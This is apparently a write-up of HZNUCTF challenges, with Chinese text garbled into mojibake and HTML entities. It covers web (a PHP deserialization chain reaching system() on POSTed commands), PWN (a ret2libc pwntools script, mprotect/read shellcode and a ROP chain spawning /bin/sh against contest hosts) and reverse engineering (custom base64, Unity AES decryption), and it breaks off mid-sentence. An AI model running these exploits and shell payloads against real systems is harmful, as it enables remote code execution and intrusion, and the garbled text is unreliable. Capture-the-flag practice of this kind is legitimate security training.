ä¸€ç›´åœ¨çˆ†500é”™è¯¯\nä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ\ræ‰“å¼€ä»¥ä¸ºæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¼ ä»€ä¹ˆæ–‡ä»¶éƒ½ä¸è¡Œï¼ŒF12çœ‹ä¸€çœ¼ï¼Œæç¤ºâ€œæœºå™¨äººæ˜¯ä»€ä¹ˆâ€\nåˆ°robotsåè®®é‡Œçœ‹ä¸€çœ¼ï¼š\n1 2 3 4 5 6 7 8 9 User-Agent: * Disallow: /admin/ Disallow: /private/ Disallow: /baidu Disallow: /s? Disallow: /unlink Disallow: /phar Disallow: !@*($^\u0026amp;*!@^\u0026amp;!*(@$# \u0026lt;--!æ–‡ä»¶ä¸Šä¼ åç¼€æ˜¯ä¸‰ä¸ªå°å†™å­—æ¯ !@#$*\u0026amp;^(!%@#$#^\u0026amp;!--\u0026gt; Disallow: /class.php è¿› class.php\nå‘ç°æ˜¯PHPååºåˆ—åŒ–ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 php \u0026lt;?php highlight_file(__FILE__); error_reporting(0); function best64_decode($str) { return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str))))); } class yesterday { public $learn; public $study=\u0026#34;study\u0026#34;; public $try; public function __construct() { $this-\u0026gt;learn = \u0026#34;learn\u0026lt;br\u0026gt;\u0026#34;; } public function __destruct() { echo \u0026#34;You studied hard yesterday.\u0026lt;br\u0026gt;\u0026#34;; return $this-\u0026gt;study-\u0026gt;hard(); } } class today { public $doing; public $did; public $done; public function __construct(){ $this-\u0026gt;did = \u0026#34;What you did makes you outstanding.\u0026lt;br\u0026gt;\u0026#34;; } public function __call($arg1, $arg2) { $this-\u0026gt;done = \u0026#34;And what you\u0026#39;ve done has given you a choice.\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;done; if(md5(md5($this-\u0026gt;doing))==666){ return $this-\u0026gt;doing(); } else{ return $this-\u0026gt;doing-\u0026gt;better; } } } class tommoraw { public $good; public $bad; public $soso; public function __invoke(){ $this-\u0026gt;good=\u0026#34;You\u0026#39;ll be good tommoraw!\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;good; } public function __get($arg1){ $this-\u0026gt;bad=\u0026#34;You\u0026#39;ll be bad tommoraw!\u0026lt;br\u0026gt;\u0026#34;; } } class future{ private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; public function __set($arg1, $arg2) { if ($this-\u0026gt;out-\u0026gt;useful7) { echo \u0026#34;Seven is my lucky number\u0026lt;br\u0026gt;\u0026#34;; system(\u0026#39;whoami\u0026#39;); } } public function __toString(){ echo \u0026#34;This is your future.\u0026lt;br\u0026gt;\u0026#34;; system($_POST[\u0026#34;wow\u0026#34;]); return \u0026#34;win\u0026#34;; } public function __destruct(){ $this-\u0026gt;no = \u0026#34;no\u0026#34;; return $this-\u0026gt;no; } } if (file_exists($_GET[\u0026#39;filename\u0026#39;])){ echo \u0026#34;Focus on the previous step!\u0026lt;br\u0026gt;\u0026#34;; } else{ $data=substr($_GET[\u0026#39;filename\u0026#39;],0,-4); unserialize(best64_decode($data)); } // You learn yesterday, you choose today, can you get to your future? ?\u0026gt; è¦è§£å†³è¿™é“é¢˜ï¼Œéœ€è¦æ„é€ ä¸€ä¸ªååºåˆ—åŒ–é“¾ï¼Œè§¦å‘futureç±»çš„__toStringæ–¹æ³•ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\næ­¥éª¤è§£æ\n1.è§¦å‘ææ„å‡½æ•°ï¼š\n1 2 3 å½“yesterdayå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå…¶__destructæ–¹æ³•ä¼šè°ƒç”¨$this-\u0026gt;study-\u0026gt;hard()ã€‚ å°†yesterdayçš„studyå±æ€§è®¾ä¸ºtodayå¯¹è±¡ï¼Œè§¦å‘todayçš„__callæ–¹æ³•ã€‚ 2.è°ƒç”¨é­”æœ¯æ–¹æ³•ï¼š\n1 2 3 todayçš„__callæ–¹æ³•åœ¨è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼ˆå¦‚hardï¼‰æ—¶è§¦å‘ã€‚ æ­¤æ—¶ä¼šæ£€æŸ¥$this-\u0026gt;doingçš„ä¸¤æ¬¡MD5å“ˆå¸Œæ˜¯å¦ç­‰äº666ã€‚ 3.ç»•è¿‡æ¡ä»¶æ£€æŸ¥ï¼š\n1 2 3 å³ä½¿æ¡ä»¶ä¸æ»¡è¶³ï¼Œåªè¦$this-\u0026gt;doingæ˜¯futureå¯¹è±¡ï¼Œåœ¨è®¡ç®—MD5æ—¶ä¼šå°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè§¦å‘__toStringæ–¹æ³•ã€‚ futureçš„__toStringæ‰§è¡Œsystem($_POST[\u0026#39;wow\u0026#39;])ï¼Œç›´æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ Payload ç”Ÿæˆä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 php \u0026lt;?php class yesterday { public $study; } class today { public $doing; } class future {} $future = new future(); $today = new today(); $today-\u0026gt;doing = $future; $yesterday = new yesterday(); $yesterday-\u0026gt;study = $today; $payload = serialize($yesterday); for ($i = 0; $i \u0026lt; 5; $i++) { $payload = base64_encode($payload); } echo $payload . \u0026#39;.txt\u0026#39;; // è§¦å‘ååºåˆ—åŒ– ?\u0026gt; GETæ–¹å¼ä¼ Payload,POSTæ–¹å¼ä¼ é€’å‘½ä»¤wow=cat /flag\nå¾—åˆ°flag\nPWN\rç­¾åˆ° ä¿æŠ¤åªå¼€äº†NXï¼Œret2libc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 c int __fastcall main(int argc, const char **argv, const char **envp) { char v4[112]; // [rsp+0h] [rbp-70h] BYREF setbuf(stdin, 0LL); setbuf(_bss_start, 0LL); setbuf(stderr, 0LL); puts( \u0026#34;As a student who has been learning pwn for half a year\\n\u0026#34; \u0026#34;basic ROP is an essential skill that everyone should master. \\n\u0026#34; \u0026#34;Therefore, hurry up and complete the check-in. \\n\u0026#34; \u0026#34;Welcome to the Hangzhou Normal University CTF competition, please leave your name.\u0026#34;); gets(v4); return 0; } å…ˆæ³„éœ²putsåœ°å€å¾—åˆ°åŸºå€å†è°ƒç”¨system\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 python from pwn import* #p=process(\u0026#34;./pwn\u0026#34;) p=remote(\u0026#34;node1.tgctf.woooo.tech\u0026#34;,30372) elf=ELF(\u0026#34;./pwn\u0026#34;) libc=ELF(\u0026#34;./libc.so.6\u0026#34;) puts_plt=elf.plt[\u0026#34;puts\u0026#34;] puts_got=elf.got[\u0026#34;puts\u0026#34;] pop_rdi_ret=0x401176 ret=0x40101a main=0x401178 p.recvuntil(b\u0026#34;name.\u0026#34;) pl1=b\u0026#39;a\u0026#39;*0x78+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main) #0x70 p.sendline(pl1) puts_addr=u64(p.recvuntil(b\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(puts_addr)) #0x7fe6ca5e2e50 libcbase=puts_addr-libc.symbols[\u0026#34;puts\u0026#34;] print(hex(libcbase)) #0x7fe6ca562000 system=libcbase+libc.symbols[\u0026#34;system\u0026#34;] binsh=libcbase+next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) pl2=b\u0026#39;a\u0026#39;*0x78+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system) #pl2=b\u0026#39;a\u0026#39;*0x78+p64(pop_rdi_ret)+p64(binsh)+p64(system) p.sendline(pl2) p.interactive() shellcode pl1:\n(è°ƒç”¨mprotectä¿®æ”¹æƒé™ï¼Œå†è°ƒç”¨) mov dl,7 mov sil,0xff mov al,0xa syscall ï¼ˆè°ƒç”¨readï¼Œå°†è¦å‘ç¼“å†²åŒºè¯»å–shellcodeï¼‰ xor edi,edi xor edx,esi xchg rsi,rcx syscall\npl2:\nnop*0x10\nadd rsi,0x20f mov rsp,rsi\nshellcode\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 python from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) p=remote(\u0026#34;node2.tgctf.woooo.tech\u0026#34;,32130) #shellcode=\u0026#34;\\x99\\x48\\xBF\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x57\\x48\\x89\\xE7\\xB0\\x3B\\x0F\\x05\u0026#34; #shellcode=\u0026#34;\\x48\\x87\\xFC\\xBF\\x73\\x68\\x00\\x00\\x57\\x54\\x5F\\xB0\\x3B\\x0F\\x05\u0026#34; pl1=\u0026#34;\\xB2\\x07\\x40\\xB6\\xFF\\xB0\\x0A\\x0F\\x05\\x31\\xFF\\x31\\xF2\\x48\\x87\\xCE\\x0F\\x05\u0026#34; p.send(pl1) pause() pl2=b\u0026#34;\\x90\u0026#34;*0x10+b\u0026#34;\\x48\\x81\\xC6\\x0F\\x02\\x00\\x00\\x48\\x89\\xF4\u0026#34;+asm(shellcraft.sh()) p.send(pl2) p.interactive() overflow é¢˜ç›®åœ¨retä¹‹å‰é€šè¿‡lea esp, [ebp-8] pop ecx lea esp, [ecx-4]è°ƒæ•´äº†æ ˆå¸§ï¼Œå› æ­¤æˆ‘ä»¬é€šè¿‡æº¢å‡ºå°†rspæ§åˆ¶åˆ°bssæ®µï¼Œåœ¨bssæ®µå†™å…¥rop\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 python from pwn import * context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;) p=process(\u0026#34;./pwn\u0026#34;) #p=remote(\u0026#34;node1.tgctf.woooo.tech\u0026#34;,31248) eax_add=0x80b470a ebx_add=0x08049022 ecx_add=0x08049802 edx_add=0x08060bd1 int80=0x08049c6a name=0x080EF320 gdb.attach(p) pause() p.recvuntil(b\u0026#34;me?\u0026#34;) p.send(b\u0026#34;/bin/sh\\x00\u0026#34;+b\u0026#39;a\u0026#39;*8+p32(ebx_add)+p32(name)+p32(ecx_add)+p32(0)+p32(edx_add)+p32(0)+p32(eax_add)+p32(0xb)+p32(int80)) p.recvuntil(\u0026#34;right?\u0026#34;) pl=b\u0026#39;a\u0026#39;*200+p32(0x080EF334) p.sendline(pl) p.interactive() Reverse\rdeepseekç”¨å¾—å¥½ï¼Œé€†å‘å·¥ç¨‹éš¾ä¸å€’ï¼ˆbushiï¼‰\nBase64\ré¢˜ç›®æç¤ºæ˜¯base64ç®—æ³•ï¼Œè¿›IDAçœ‹çœ‹ä¼ªC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 c nt __fastcall main(int argc, const char **argv, const char **envp) { char *v3; // rbx __int64 v4; // rcx void *v5; // rbx char Destination[16]; // [rsp+20h] [rbp-28h] BYREF sub_140001020(\u0026#34;Welcome to HZNUCTF!!!\\n\u0026#34;); sub_140001020(\u0026#34;Plz input your flag:\\n\u0026#34;); v3 = (char *)malloc(\u0026#39;*\u0026#39;); sub_140001080(\u0026#34;%s\u0026#34;); v4 = -1i64; do ++v4; while ( v3[v4] ); if ( v4 == 41 ) { strncpy_s(Destination, 9ui64, v3, 8ui64); Destination[8] = 0; if ( !strcmp(Destination, \u0026#34;HZNUCTF{\u0026#34;) ) { v5 = (void *)sub_1400010E0(v3); if ( !strcmp((const char *)v5, \u0026#34;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\u0026#34;) ) { sub_140001020(\u0026#34;Congratulation!!!\u0026#34;); free(v5); exit(1); } sub_140001020(\u0026#34;wrong_wrong!!!\u0026#34;); free(v5); exit(1); } sub_140001020(\u0026#34;wrong head!!!\u0026#34;); free(v3); exit(1); } sub_140001020(\u0026#34;wrong len!!!\u0026#34;); free(v3); return 0; } è¿›sub_1400010E0çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 c _BYTE *__fastcall sub_1400010E0(__int64 a1) { __int64 v2; // rbx __int64 v3; // rbp int v4; // edx int v5; // edi int v6; // edx __int64 v7; // r14 size_t v8; // rcx _BYTE *v9; // r8 __int64 v10; // r9 unsigned __int64 v11; // rdx int v12; // ecx unsigned int v13; // ecx unsigned int v14; // eax int v15; // eax int v16; // eax int v17; // eax int v18; // edi __int64 v19; // rdx int v20; // eax int v21; // eax int v22; // ecx unsigned int v23; // edx int v24; // ecx int v25; // eax int v26; // ecx unsigned int v27; // ecx unsigned int v28; // eax char v30[80]; // [rsp+20h] [rbp-68h] BYREF int v31; // [rsp+90h] [rbp+8h] v2 = -1i64; strcpy(v30, \u0026#34;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\u0026#34;); do ++v2; while ( *(_BYTE *)(a1 + v2) ); v3 = 0i64; v4 = (int)v2 / 3; if ( (_DWORD)v2 == 3 * ((int)v2 / 3) ) { v5 = 0; v6 = 4 * v4; } else if ( (int)v2 % 3 == 1 ) { v5 = 1; v6 = 4 * v4 + 4; } else if ( (int)v2 % 3 == 2 ) { v5 = 2; v6 = 4 * v4 + 4; } else { v5 = v31; v6 = v31; } v7 = v6; v8 = v6 + 1i64; if ( v6 == -1i64 ) v8 = -1i64; v9 = malloc(v8); if ( (int)v2 - v5 \u0026gt; 0 ) { v10 = a1 + 2; v11 = ((int)v2 - v5 - 1i64) / 3ui64 + 1; do { v3 += 4i64; v12 = *(unsigned __int8 *)(v10 - 2) \u0026gt;\u0026gt; 2; v10 += 3i64; v13 = v12 + 24; v14 = v13 - 64; if ( v13 \u0026lt;= 0x40 ) v14 = v13; v9[v3 - 4] = v30[v14]; v15 = ((*(unsigned __int8 *)(v10 - 4) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v10 - 5) \u0026amp; 3))) - 40; if ( ((*(unsigned __int8 *)(v10 - 4) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v10 - 5) \u0026amp; 3u))) + 24 \u0026lt;= 0x40 ) v15 = ((*(unsigned __int8 *)(v10 - 4) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v10 - 5) \u0026amp; 3))) + 24; v9[v3 - 3] = v30[v15]; v16 = ((*(unsigned __int8 *)(v10 - 3) \u0026gt;\u0026gt; 6) | (4 * (*(_BYTE *)(v10 - 4) \u0026amp; 0xF))) - 40; if ( ((*(unsigned __int8 *)(v10 - 3) \u0026gt;\u0026gt; 6) | (4 * (*(_BYTE *)(v10 - 4) \u0026amp; 0xFu))) + 24 \u0026lt;= 0x40 ) v16 = ((*(unsigned __int8 *)(v10 - 3) \u0026gt;\u0026gt; 6) | (4 * (*(_BYTE *)(v10 - 4) \u0026amp; 0xF))) + 24; v9[v3 - 2] = v30[v16]; v17 = (*(_BYTE *)(v10 - 3) \u0026amp; 0x3F) - 40; if ( (*(_BYTE *)(v10 - 3) \u0026amp; 0x3Fu) + 24 \u0026lt;= 0x40 ) v17 = (*(_BYTE *)(v10 - 3) \u0026amp; 0x3F) + 24; v9[v3 - 1] = v30[v17]; --v11; } while ( v11 ); } v18 = v5 - 1; if ( !v18 ) { v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) \u0026gt;\u0026gt; 2) - 40; if ( (*(unsigned __int8 *)((int)v2 + a1 - 1) \u0026gt;\u0026gt; 2) + 24 \u0026lt;= 0x40u ) v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) \u0026gt;\u0026gt; 2) + 24; v9[v7 - 4] = v30[v25]; v26 = *(_BYTE *)((int)v2 + a1 - 1) \u0026amp; 3; *(_WORD *)\u0026amp;v9[v7 - 2] = 15677; v27 = 16 * v26 + 24; v28 = v27 - 64; if ( v27 \u0026lt;= 0x40 ) v28 = v27; v9[v7 - 3] = v30[v28]; goto LABEL_37; } if ( v18 != 1 ) { LABEL_37: v9[v7] = 0; return v9; } v19 = a1 + (int)v2; v20 = (*(unsigned __int8 *)(v19 - 2) \u0026gt;\u0026gt; 2) - 40; if ( (*(unsigned __int8 *)(v19 - 2) \u0026gt;\u0026gt; 2) + 24 \u0026lt;= 0x40u ) v20 = (*(unsigned __int8 *)(v19 - 2) \u0026gt;\u0026gt; 2) + 24; v9[v7 - 4] = v30[v20]; v21 = ((*(unsigned __int8 *)(v19 - 1) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v19 - 2) \u0026amp; 3))) - 40; if ( ((*(unsigned __int8 *)(v19 - 1) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v19 - 2) \u0026amp; 3u))) + 24 \u0026lt;= 0x40 ) v21 = ((*(unsigned __int8 *)(v19 - 1) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v19 - 2) \u0026amp; 3))) + 24; v9[v7 - 3] = v30[v21]; v22 = *(_BYTE *)(v19 - 1) \u0026amp; 0xF; *(_WORD *)\u0026amp;v9[v7 - 1] = 61; v23 = 4 * v22 + 24; v24 = 4 * v22 - 40; if ( v23 \u0026lt;= 0x40 ) v24 = v23; v9[v7 - 2] = v30[v24]; return v9; } æˆ‘ä»¬çœ‹åˆ°é­”æ”¹çš„base64ç¼–ç è¡¨ GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\né€šè¿‡è¯»æºç æˆ‘ä»¬å¾—çŸ¥ï¼Œç¨‹åºå°†è¾“å…¥çš„flagä½¿ç”¨è‡ªå®šä¹‰çš„base64ç¼–ç è¡¨è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°å­—ç¬¦ä¸² AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\næˆ‘ä»¬é€†å‘é€»è¾‘ç¼–å†™è„šæœ¬å¾—åˆ°flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 python import base64 def custom_b64decode(encoded_str): # è‡ªå®šä¹‰ç¼–ç è¡¨ table = \u0026#34;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\u0026#34; # åˆ›å»ºè§£ç å­—å…¸ï¼šå­—ç¬¦ -\u0026gt; (åŸå§‹å€¼ -24) mod 64 decode_table = {c: (i - 24) % 64 for i, c in enumerate(table)} # å¤„ç†å¡«å……å¹¶åˆ†å‰²æˆ4å­—ç¬¦ä¸€ç»„ pad = 0 if encoded_str.endswith(\u0026#39;==\u0026#39;): pad = 2 encoded_str = encoded_str[:-2] + \u0026#39;AA\u0026#39; # æ›¿æ¢å¡«å……ä¸ºå¯å¤„ç†çš„å­—ç¬¦ elif encoded_str.endswith(\u0026#39;=\u0026#39;): pad = 1 encoded_str = encoded_str[:-1] + \u0026#39;A\u0026#39; # æ›¿æ¢å¡«å…… # è½¬æ¢ä¸ºäºŒè¿›åˆ¶å€¼åˆ—è¡¨ decoded_values = [] for c in encoded_str: decoded_values.append(decode_table.get(c, 0)) # æœªçŸ¥å­—ç¬¦è§†ä¸º0 # å°†4ä¸ª6ä½å€¼è½¬æ¢ä¸º3ä¸ªå­—èŠ‚ result = bytearray() for i in range(0, len(decoded_values), 4): chunk = decoded_values[i:i + 4] if len(chunk) \u0026lt; 4: chunk += [0] * (4 - len(chunk)) # åˆå¹¶æˆ24ä½æ•´æ•° val = (chunk[0] \u0026lt;\u0026lt; 18) | (chunk[1] \u0026lt;\u0026lt; 12) | (chunk[2] \u0026lt;\u0026lt; 6) | chunk[3] # æ‹†åˆ†ä¸º3å­—èŠ‚ bytes_group = [ (val \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (val \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, val \u0026amp; 0xFF ] # å¤„ç†å¡«å……æˆªæ–­ if i == len(decoded_values) - 4: if pad == 1: bytes_group = bytes_group[:2] elif pad == 2: bytes_group = bytes_group[:1] result.extend(bytes_group) return bytes(result) # ç›®æ ‡åŠ å¯†åçš„Base64å­—ç¬¦ä¸² encoded = \u0026#34;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\u0026#34; flag = custom_b64decode(encoded) print(flag) å¾—åˆ°flag\næ°´æœå¿è€…\rå¾ˆç†Ÿæ‚‰çš„æ°´æœå¿è€…å°æ¸¸æˆï¼Œè®¸å¤šå¹´ä¹‹åï¼Œé¢å¯¹Unityé€†å‘åç‰¢ï¼Œæˆ‘å°†ä¼šå›æƒ³èµ·ï¼Œæˆ‘åœ¨å§å®¤å·å·ç”¨å®¶é•¿æ‰‹æœºç©æ¸¸æˆçš„é‚£ä¸ªé¥è¿œçš„æ™šä¸Šï¼ˆbushiï¼‰ã€‚\nç”¨ dnSpyæ‰“å¼€ï¼Œå®šä½åˆ° Assembly_CSharp -\u0026gt; GameManager\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 c# using System; using System.Collections; using System.IO; using System.Security.Cryptography; using System.Text; using UnityEngine; using UnityEngine.UI; // Token: 0x02000005 RID: 5 [DefaultExecutionOrder(-1)] public class GameManager : MonoBehaviour { // Token: 0x17000003 RID: 3 // (get) Token: 0x06000013 RID: 19 RVA: 0x00002351 File Offset: 0x00000551 // (set) Token: 0x06000014 RID: 20 RVA: 0x00002358 File Offset: 0x00000558 public static GameManager Instance { get; private set; } // Token: 0x17000004 RID: 4 // (get) Token: 0x06000015 RID: 21 RVA: 0x00002360 File Offset: 0x00000560 // (set) Token: 0x06000016 RID: 22 RVA: 0x00002368 File Offset: 0x00000568 public int score { get; private set; } // Token: 0x06000017 RID: 23 RVA: 0x00002371 File Offset: 0x00000571 private void Awake() { if (GameManager.Instance != null) { Object.DestroyImmediate(base.gameObject); return; } GameManager.Instance = this; } // Token: 0x06000018 RID: 24 RVA: 0x00002392 File Offset: 0x00000592 private void OnDestroy() { if (GameManager.Instance == this) { GameManager.Instance = null; } } // Token: 0x06000019 RID: 25 RVA: 0x000023A7 File Offset: 0x000005A7 private void Start() { this.NewGame(); } // Token: 0x0600001A RID: 26 RVA: 0x000023B0 File Offset: 0x000005B0 private void NewGame() { Time.timeScale = 1f; this.ClearScene(); this.blade.enabled = true; this.spawner.enabled = true; this.score = 0; this.scoreText.text = this.score.ToString(); if (this.decryptedTextDisplay != null) { this.decryptedTextDisplay.text = \u0026#34;\u0026#34;; } } // Token: 0x0600001B RID: 27 RVA: 0x00002424 File Offset: 0x00000624 private void ClearScene() { Fruit[] array = Object.FindObjectsOfType\u0026lt;Fruit\u0026gt;(); for (int i = 0; i \u0026lt; array.Length; i++) { Object.Destroy(array[i].gameObject); } Bomb[] array2 = Object.FindObjectsOfType\u0026lt;Bomb\u0026gt;(); for (int i = 0; i \u0026lt; array2.Length; i++) { Object.Destroy(array2[i].gameObject); } } // Token: 0x0600001C RID: 28 RVA: 0x00002474 File Offset: 0x00000674 public void IncreaseScore(int points) { this.score += points; this.scoreText.text = this.score.ToString(); if (this.score \u0026gt;= 999999999) { byte[] cipherText = this.ConvertHexStringToByteArray(GameManager.encryptedHexData); string text = this.Decrypt(cipherText, GameManager.encryptionKey, GameManager.iv); if (this.decryptedTextDisplay != null) { this.decryptedTextDisplay.text = text; } } else if (this.decryptedTextDisplay != null) { this.decryptedTextDisplay.text = \u0026#34;\u0026#34;; } float num = PlayerPrefs.GetFloat(\u0026#34;hiscore\u0026#34;, 0f); if ((float)this.score \u0026gt; num) { num = (float)this.score; PlayerPrefs.SetFloat(\u0026#34;hiscore\u0026#34;, num); } } // Token: 0x0600001D RID: 29 RVA: 0x0000253C File Offset: 0x0000073C private byte[] ConvertHexStringToByteArray(string hex) { int length = hex.Length; byte[] array = new byte[length / 2]; for (int i = 0; i \u0026lt; length; i += 2) { array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16); } return array; } // Token: 0x0600001E RID: 30 RVA: 0x0000257C File Offset: 0x0000077C private string Decrypt(byte[] cipherText, string key, string iv) { string result; using (Aes aes = Aes.Create()) { aes.Key = Encoding.UTF8.GetBytes(key); aes.IV = Encoding.UTF8.GetBytes(iv); aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV); using (MemoryStream memoryStream = new MemoryStream(cipherText)) { using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read)) { using (StreamReader streamReader = new StreamReader(cryptoStream)) { result = streamReader.ReadToEnd(); } } } } return result; } // Token: 0x0600001F RID: 31 RVA: 0x00002658 File Offset: 0x00000858 public void Explode() { this.blade.enabled = false; this.spawner.enabled = false; base.StartCoroutine(this.ExplodeSequence()); } // Token: 0x06000020 RID: 32 RVA: 0x0000267F File Offset: 0x0000087F private IEnumerator ExplodeSequence() { float elapsed = 0f; float duration = 0.5f; while (elapsed \u0026lt; duration) { float num = Mathf.Clamp01(elapsed / duration); this.fadeImage.color = Color.Lerp(Color.clear, Color.white, num); Time.timeScale = 1f - num; elapsed += Time.unscaledDeltaTime; yield return null; } yield return new WaitForSecondsRealtime(1f); this.NewGame(); elapsed = 0f; while (elapsed \u0026lt; duration) { float t = Mathf.Clamp01(elapsed / duration); this.fadeImage.color = Color.Lerp(Color.white, Color.clear, t); elapsed += Time.unscaledDeltaTime; yield return null; } yield break; } // Token: 0x0400000F RID: 15 [SerializeField] private Blade blade; // Token: 0x04000010 RID: 16 [SerializeField] private Spawner spawner; // Token: 0x04000011 RID: 17 [SerializeField] private Text scoreText; // Token: 0x04000012 RID: 18 [SerializeField] private Image fadeImage; // Token: 0x04000013 RID: 19 [Header(\u0026#34;Decrypted Text Display\u0026#34;)] [SerializeField] private Text decryptedTextDisplay; // Token: 0x04000015 RID: 21 private static readonly string encryptionKey = \u0026#34;HZNUHZNUHZNUHZNU\u0026#34;; // Token: 0x04000016 RID: 22 private static readonly string iv = \u0026#34;0202005503081501\u0026#34;; // Token: 0x04000017 RID: 23 private static readonly string encryptedHexData = \u0026#34;cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf\u0026#34;; } çœ‹åˆ°æ˜¯AESç®—æ³•\nencryptedHexDataæ˜¯ç¡¬ç¼–ç çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ŒåŠ å¯†å¯†é’¥å’ŒIVåˆ†åˆ«æ˜¯â€HZNUHZNUHZNUHZNUâ€å’Œâ€0202005503081501â€ã€‚\nDecryptæ–¹æ³•ä½¿ç”¨äº†AESçš„CBCæ¨¡å¼ï¼Œå¡«å……æ–¹å¼æ˜¯PKCS7ã€‚å› æ­¤ï¼Œè§£å¯†æ—¶éœ€è¦æ­£ç¡®çš„å¯†é’¥å’ŒIVï¼Œå¹¶ä¸”å¯†æ–‡æ˜¯ç»è¿‡åå…­è¿›åˆ¶ç¼–ç çš„ï¼Œéœ€è¦å…ˆè½¬æ¢å›å­—èŠ‚æ•°ç»„ã€‚\nåŠ 